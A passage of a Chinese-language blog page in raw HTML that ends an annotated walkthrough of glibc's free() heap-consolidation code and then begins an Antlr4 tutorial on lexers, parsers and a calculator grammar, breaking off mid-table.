class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);<span class="comment">//下一个堆块的大小</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//下一堆块的大小必须在合法范围(2*SIZE_SZ,av-&gt;system_mem)之内</span></span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);<span class="comment">//p数据区清零</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))<span class="comment">//向前合并</span></span><br><span class="line">    &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)<span class="comment">//如果后块时topchunk则合并到topchunk,否则尝试向后合并</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse)<span class="comment">//如果后一堆块空闲则向后合并</span></span><br><span class="line">      &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">  Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">  not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">  been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);<span class="comment">//释放的堆块放到unsortedbin中,下一次malloc才可能重新安排新去处</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))<span class="comment">//如果是largebin的堆块则现在就把fd_nextsize和bk_nextsize清零</span></span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span><span class="comment">//此else意味着向后与topchunk相邻,则合并到topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD)</span><br><span class="line">    &#123;<span class="comment">//如果size大于fastbin合并阈值65536</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);<span class="comment">//清空fastbin,该合并合并,放到unsortedbin或者topchunk</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena)<span class="comment">//如果是主分配区</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))<span class="comment">//如果topchunk太大了就得修剪一下</span></span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//否则就是非主分配区的辅助堆</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(locked);<span class="comment">//保证事务完整性</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="mmap映射区释放"><a href="#mmap映射区释放" class="headerlink" title="mmap映射区释放"></a>mmap映射区释放</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  munmap_chunk(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/05/31/Antlr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/31/Antlr/" class="post-title-link" itemprop="url">Antlr4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-05-31 22:31:00" itemprop="dateCreated datePublished" datetime="2023-05-31T22:31:00+08:00">2023-05-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-24 22:10:17" itemprop="dateModified" datetime="2024-04-24T22:10:17+08:00">2024-04-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Antlr4"><a href="#Antlr4" class="headerlink" title="Antlr4"></a>Antlr4</h1><p>项目地址<a target="_blank" rel="noopener" href="https://github.com/DeutschBall/Interpreter-Antlr">DeutschBall&#x2F;Interpreter-Antlr: Antlr实现的函数绘图语言解释器 (github.com)</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">antlr Hello.g4</span><br></pre></td></tr></table></figure>

<p>这种生成命令,实际上这里的antlr执行的命令是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java org.antlr.v4.Tool ./Hello.g4</span><br></pre></td></tr></table></figure>

<p>也就是说,org.antlr.v4.Tool应该是在CLASSPATH中的</p>
<p>在windows中需要在变量CLASSPATH中加上jar包的地址</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230524151158485.png" alt="image-20230524151158485"></p>
<p>任何一个Antlr源文件,比如Hello.g4,如果语法没有错误,执行antlr4 Hello.g4之后,都会生成六个文件</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>HelloParser.java</td>
<td>不想写</td>
<td></td>
</tr>
<tr>
<td>HelloLexer.java</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Hello.tokens</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloLexer.tokens</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloListener.java</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloBaseListener.java</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="词法分析器"><a href="#词法分析器" class="headerlink" title="词法分析器"></a>词法分析器</h2><p>词法分析器实现,继承自org.antlr.v4.runtime.Lexer</p>
<p>这个类干了啥呢?</p>
<p>首先,<code>*Lexer.java</code>文件中是没有main函数的,这就意味着,这个类只能作为其他类的组成,或者被其他函数调用</p>
<p>从名字上看,这个类应该得有一个DFA,不管是表驱动的还是有向图驱动的还是硬编码的,得有一个输入,然后从输入中获取符号流,然后在DFA上进行状态转移,每次调用它,都应返回一个识别出的记号token</p>
<p>举个例子,统计单词数量</p>
<p>antlr语法规则文件这样写:</p>
<p><code>Counter.g4</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lexer grammar Counter;</span><br><span class="line"></span><br><span class="line">WORD: [a-zA-Z0-9]+;</span><br><span class="line">SPACE: [ \t\n\r]-&gt;skip;</span><br></pre></td></tr></table></figure>

<p>然后执行命令<code>antlr4 ./Counter.g4</code></p>
<p>由于g4文件中只定义了词法规则 lexer grammer,因此只会生成词法分析器相关的文件</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Counter.interp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Counter.java</td>
<td>词法分析器类</td>
<td></td>
</tr>
<tr>
<td>Counter.tokens</td>
<td>定义符号与到整数的映射</td>
<td></td>
</tr>
</tbody></table>
<p>生成一堆文件,其中就包括Counter.java,也就是词法分析器文件</p>
<p>这里面就一个Counter类,它干了啥呢?</p>
<p>最主要的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">_serializedATN</span> <span class="operator">=</span></span><br><span class="line">	<span class="string">&quot;\3\u608b\ua72a\u8133\ub9ed\u417c\u3be7\u7786\u5964\2\4\20\b\1\4\2\t\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\4\3\t\3\3\2\6\2\t\n\2\r\2\16\2\n\3\3\3\3\3\3\3\3\2\2\4\3\3\5\4\3\2\4&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\5\2\62;C\\c|\5\2\13\f\17\17\&quot;\&quot;\2\20\2\3\3\2\2\2\2\5\3\2\2\2\3\b\3\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\2\2\5\f\3\2\2\2\7\t\t\2\2\2\b\7\3\2\2\2\t\n\3\2\2\2\n\b\3\2\2\2\n\13&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\3\2\2\2\13\4\3\2\2\2\f\r\t\3\2\2\r\16\3\2\2\2\16\17\b\3\2\2\17\6\3\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\2\2\4\2\n\3\b\2\2&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ATN</span> <span class="variable">_ATN</span> <span class="operator">=</span></span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ATNDeserializer</span>().deserialize(_serializedATN.toCharArray());</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">	_decisionToDFA = <span class="keyword">new</span> <span class="title class_">DFA</span>[_ATN.getNumberOfDecisions()];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _ATN.getNumberOfDecisions(); i++) &#123;</span><br><span class="line">		_decisionToDFA[i] = <span class="keyword">new</span> <span class="title class_">DFA</span>(_ATN.getDecisionState(i), i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中有一个硬编码的static字符串,其中存放了序列化的ATN,ATN是啥?状态转移网络</p>
<p>这里_ATN这个static成员在本类的加载时,就会反序列化_serializedATN,建立ATN网络,</p>
<p>然后static静态代码块中,以ATN网络为基础建立了DFA</p>
<p>至于这个序列化ATN字符串什么含义,我不想研究,相当于硬编码的DFA</p>
<p>本类中害保存了符号名称,比如WORD,SPACE</p>
<p>本类从org.antlr.v4.runtime.Lexer基类中继承了nextToken等函数,nextToken函数每次被调用会识别一个符号</p>
<p>如何使用该类呢?</p>
<p>可以写一个测试类TestLexer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.CharStreams;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.Token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLexer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> cnt_words=<span class="number">0</span>;</span><br><span class="line">        <span class="type">CharStream</span> <span class="variable">input</span> <span class="operator">=</span> CharStreams.fromString(<span class="string">&quot;public static void main&quot;</span>);</span><br><span class="line">        Counter lexer=<span class="keyword">new</span> <span class="title class_">Counter</span>(input);</span><br><span class="line">        Token token;</span><br><span class="line">        <span class="keyword">while</span>((token=lexer.nextToken()).getType()!=Token.EOF)&#123;</span><br><span class="line">            String tokenName=Counter.VOCABULARY.getSymbolicName(token.getType());</span><br><span class="line">            String tokenText=token.getText();</span><br><span class="line">            System.out.printf(<span class="string">&quot;%s: %s%n&quot;</span>,tokenName,tokenText);</span><br><span class="line">            <span class="keyword">if</span>(tokenName==<span class="string">&quot;WORD&quot;</span>)&#123;</span><br><span class="line">                ++cnt_words;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;total words=&quot;</span>+cnt_words);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从字符串”public static void main”创建一个字符输入流,然后将这个流作为Counter lexer的输入</p>
<p>此后每次调用lexer.nextToken(),lexer都会尝试从该字符输入流中获取一个符号,符号的类型是org.antlr.v4.runtime.Token</p>
<h2 id="语法分析器"><a href="#语法分析器" class="headerlink" title="语法分析器"></a>语法分析器</h2><p>以计算器为例</p>
<p>Calculator.g4</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">grammar Calculator;</span><br><span class="line"><span class="comment">// import LexerRule;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法定义</span></span><br><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      </span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    </span><br><span class="line">|NEWLINE                </span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (<span class="string">&#x27;*&#x27;</span>|<span class="string">&#x27;/&#x27;</span>) expr   </span><br><span class="line">|expr (<span class="string">&#x27;+&#x27;</span>|<span class="string">&#x27;-&#x27;</span>) expr        </span><br><span class="line">|INT                        </span><br><span class="line">|ID                         </span><br><span class="line">|<span class="string">&#x27;(&#x27;</span> expr <span class="string">&#x27;)&#x27;</span>               </span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ID: [a-zA-Z]+;</span><br><span class="line">INT:[<span class="number">0</span>-<span class="number">9</span>]+;</span><br><span class="line">WS:[ \t\n]+ -&gt;skip;<span class="comment">//多余的空格回车忽略</span></span><br><span class="line">NEWLINE: <span class="string">&#x27;\r&#x27;</span>? <span class="string">&#x27;\n&#x27;</span>;<span class="comment">//\r\n是win上的换行符,\r是linux上的换行</span></span><br></pre></td></tr></table></figure>

<p>执行命令<code>antlr4 ./Calculator.g4</code>之后,会在本目录下生成</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>CalculatorLexer.java</td>
<td>词法分析器类</td>
<td></td>
</tr>
<tr>
<td>CalculatorParser.java</td>
<td>语法分析器类</td>
<td></td>
</tr>
<tr>
<td>CalculatorListener.java</td>
<td>监听器接口</td>
<td></td>
</tr>
<tr>
<td>Calculator.BaseListener.java</td>
<td>监听器基类</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>写一个测试类Test,测试语法分析器的作用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.antlr.runtime.ANTLRInputStream;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.CharStreams;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.Token;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.tree.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.tool.ANTLRToolListener;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String inputFile=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            inputFile=args[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        CharStream input=<span class="literal">null</span>;</span><br><span class="line">        InputStream is=System.in;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(inputFile!=<span class="literal">null</span>)&#123;</span><br><span class="line">                is=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(inputFile);</span><br><span class="line">            &#125;</span><br><span class="line">            input=CharStreams.fromStream(is);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ANTLRInputStream input=new ANTLRInputStream(is);</span></span><br><span class="line">        CalculatorLexer lexer=<span class="keyword">new</span> <span class="title class_">CalculatorLexer</span>(input);</span><br><span class="line">        CommonTokenStream tokens=<span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer);</span><br><span class="line">        CalculatorParser parser=<span class="keyword">new</span> <span class="title class_">CalculatorParser</span>(tokens);</span><br><span class="line">        ParseTree tree=parser.prog();</span><br><span class="line">        </span><br><span class="line">        System.out.println(tree.toStringTree(parser));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javac Calculator*.java Test.java</span><br><span class="line">java Test <span class="string">&quot;in.dat&quot;</span></span><br><span class="line">line 6:14 missing <span class="string">&#x27;)&#x27;</span> at <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(prog (<span class="built_in">stat</span> (<span class="built_in">expr</span> 101) \r\n) (<span class="built_in">stat</span> a = (<span class="built_in">expr</span> 5) \r\n) (<span class="built_in">stat</span> b </span><br><span class="line">= (<span class="built_in">expr</span> 3) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> a) + (<span class="built_in">expr</span> (<span class="built_in">expr</span> b) * (<span class="built_in">expr</span> 2))) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 1) + (<span class="built_in">expr</span> a)) )) </span><br><span class="line">/ (<span class="built_in">expr</span> 2)) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 5) + (<span class="built_in">expr</span> 6)) )) * (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 4) + (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 7) - (<span class="built_in">expr</span> 8)) ))) &lt;missing <span class="string">&#x27;)&#x27;</span>&gt;)) \r\n))</span><br></pre></td></tr></table></figure>



<p>也可以不写测试类,直接使用grun测试</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\antlr&gt; grun Calculator prog </span><br><span class="line">-gui in.dat</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\antlr&gt;java org.antlr.v4.gui.TestRig Calculator prog -gui in.dat</span><br><span class="line">line 6:14 missing <span class="string">&#x27;)&#x27;</span> at <span class="string">&#x27;\r\n&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526154940220.png" alt="image-20230526154940220"></p>
<p>antlr会自动检测语法错误,并且会自动从错误中恢复,继续进行语法分析</p>
<h2 id="访问器"><a href="#访问器" class="headerlink" title="访问器"></a>访问器</h2><p>前面的语法分析器中,我们并没有定义语义规则,语法树是antlr自动帮我们生成的,现在需要定义语义动作,实现计算器功能</p>
<p>antlr不推荐在g4规则文件中定义语义动作,而是在本文件中定义标签,然后在Visitor类中实现标签相关的函数</p>
<h3 id="定义语义规则标签"><a href="#定义语义规则标签" class="headerlink" title="定义语义规则标签"></a>定义语义规则标签</h3><p>比如Calculator.g4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">grammar Calculator;</span><br><span class="line">// import LexerRule;</span><br><span class="line"></span><br><span class="line">// 语法定义</span><br><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID &#x27;=&#x27; expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (&#x27;*&#x27;|&#x27;/&#x27;) expr   #MulDiv</span><br><span class="line">|expr (&#x27;+&#x27;|&#x27;-&#x27;) expr        #AddSub</span><br><span class="line">|INT                        #int</span><br><span class="line">|ID                         #id</span><br><span class="line">|&#x27;(&#x27; expr &#x27;)&#x27;               #parens</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MUL: &#x27;*&#x27;;</span><br><span class="line">DIV: &#x27;/&#x27;;</span><br><span class="line">ADD: &#x27;+&#x27;;</span><br><span class="line">SUB: &#x27;-&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ID: [a-zA-Z]+;</span><br><span class="line">INT:[0-9]+;</span><br><span class="line">WS:[ \t\n]+ -&gt;skip;//多余的空格回车忽略</span><br><span class="line">NEWLINE: &#x27;\r&#x27;? &#x27;\n&#x27;;//\r\n是win上的换行符,\r是linux上的换行</span><br></pre></td></tr></table></figure>

<p>这里的#printExpr,#assign等就是标签</p>
<p>然后使用下述命令生成</p>
<h3 id="生成访问器基类"><a href="#生成访问器基类" class="headerlink" title="生成访问器基类"></a>生成访问器基类</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">antlr4 -visitor Calculator.g4</span><br></pre></td></tr></table></figure>

<p>额外生成了两个文件</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
